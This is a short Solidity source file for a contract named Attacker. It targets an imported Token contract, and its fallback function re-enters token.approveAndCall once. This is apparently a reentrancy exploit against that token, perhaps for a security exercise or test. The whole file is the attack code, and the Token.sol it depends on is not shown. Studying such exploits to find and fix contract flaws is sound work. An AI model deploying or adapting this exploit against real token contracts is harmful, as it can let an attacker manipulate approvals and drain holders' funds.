pragma solidity ^0.4.24;

import "./Token.sol";

contract Attacker {
    Token token;
    bool attackComplete = false;

    constructor(address _token) public {
        token = Token(_token);
    }

    function () public {
        if(!attackComplete){
            attackComplete = true;
            token.approveAndCall(address(this), 100, ""); 
        }
    }
}
